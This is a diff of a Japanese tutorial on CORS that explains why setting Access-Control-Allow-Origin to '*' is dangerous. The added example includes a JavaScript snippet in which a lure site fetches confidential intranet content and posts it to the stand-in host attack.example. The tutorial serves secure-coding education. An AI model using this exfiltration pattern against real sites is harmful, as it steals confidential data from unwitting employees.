@@ -54,11 +54,26 @@ Simple Requestについては後述する。
 
 ## 問題2
 
-ブラウザからのリクエストにはCookieが自動で付与されるが、CORSの場合はCookieが自動で付与されると問題になる場合がある。
-例えば、ログイン済みのCookieを持っているユーザーにだけ重要な情報の閲覧を許可していたとする。
-そして、他のサービスと連携するために、Access-Control-Allow-Originを*で設定していたとする。
-この場合、
-この場合、 Intra にログイン済みのユーザを Attack に誘導することができれば、 Cookie で制限されていた情報の取得や、重要な操作が可能になる。 CORS をよく理解してない開発者が CORS 対応を実施した際に、こうした意図せぬ挙動を誘発してしまう可能性は少なくない。
+Access-Control-Allow-Origin: * は、すべてのオリジンからのリクエストを許可する。
+これは、攻撃者に重要な情報が盗まれる可能性がある。
+例えば、https://company.exampleは、外部に漏れてはいけない社外秘の情報があり、社内ネットワークに接続した社員のみアクセスできるとする。
+また、社員は社内ネットワークだけはなく、社外ネットワーク（インターネット）にもアクセスすることができる。
+攻撃者は、その社外秘の情報を盗むために、Webサイト https://attack.example を用意し、社員がアクセスするように何らかの方法で誘導する。
+社員がこの悪意あるサイトにアクセスすると、攻撃者に仕込まれていた次のようなJavaScriptにより、社外秘の情報が盗まれてしまう。
+
+``` JavaScript
+// Attackから社外秘の情報を取得する
+const res  = await fetch("https://company.example")
+const text = await res.text()
+
+// その情報をAttackに転送する
+await fetch("https://attack.example", {
+  method: "post",
+  body:   text
+})
+```
+
+このような攻撃が成立しないようにするために、Access-Control-Allow-Originには、信頼あるオリジンを登録した方が良い。
 
 ## 問題3
 
